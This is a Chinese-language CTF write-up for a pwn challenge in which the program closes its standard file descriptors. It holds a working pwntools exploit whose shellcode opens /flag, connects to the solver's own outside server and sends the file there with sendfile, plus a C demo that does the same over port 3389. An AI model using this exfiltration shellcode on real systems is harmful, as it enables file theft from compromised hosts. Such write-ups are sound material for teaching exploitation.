# No Output

> 分类：Pwn

## 题目描述
无沙箱的 shellcode 题，但程序关闭了 `0`、`1`、`2` 三个文件描述符，即关闭了标准输入、标准输出和标准错误输出。需要想办法把 flag 带出来。

## 考察知识点
- Shellcode 编写
- 关闭标准 IO 后的外带思路（socket + connect + sendfile）
- ptrace 修改进程段内存（nop 掉 close012）
- 侧信道爆破

## 解法
由于靶机出网，可以直接连公网服务器，使用 `send` 把 flag 发送到服务器上。先 `open("/flag")`，再用 socket 连接到自己的服务器，最后用 `sendfile` 把文件内容发送过去。

EXP：

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

k = 1
if k:
    host = addr.split(':')
    p = remote(host[0], host[1])
else:
    p = process('./No_Output')
elf = ELF('./No_Output')

def debug():
    gdb.attach(p,'b *0x40184D\nc\n')

shellcode = '''
    mov rsp, 0xd001000
    mov rbp, 0xd002000
'''

shellcode += shellcraft.open("/flag")
shellcode += shellcraft.syscall('SYS_socket', 2, 1, 0) # 使用 syscall 创建 socket (AF_INET = 2, SOCK_STREAM = 1)
shellcode += '''
    mov rax, ........(此处为 remote ip）
    mov qword ptr [rsp], rax
    mov qword ptr [rsp + 0x8], 0
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x10
    mov rax, SYS_connect
    syscall
'''
shellcode += shellcraft.sendfile(1, 0, 0, 0x100)

s(asm(shellcode))

p.interactive()
```

`connect` 的参数可以写一个 C 语言的 demo，编译后动调将内存复制出来：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

void send_file_content() {
    const char *filename = "/flag";
    const char *ip_address = "";
    int port = 3389;
    int sock;
    struct sockaddr_in server_addr;
    char buffer[1024];
    FILE *file;

    file = fopen(filename, "r");
    sock = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip_address, &server_addr.sin_addr);

    connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    while (fgets(buffer, sizeof(buffer), file) != NULL) {
        send(sock, buffer, strlen(buffer), 0);
    }

    fclose(file);
    close(sock);
}
```

其他思路：使用两个进程，一个去 ptrace 另一个，直接修改其程序段内存，把 `close012` 给 nop 掉（靶机初始 pid 一致）；也可以使用侧信道爆破。

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week5/pwn/no_output.html
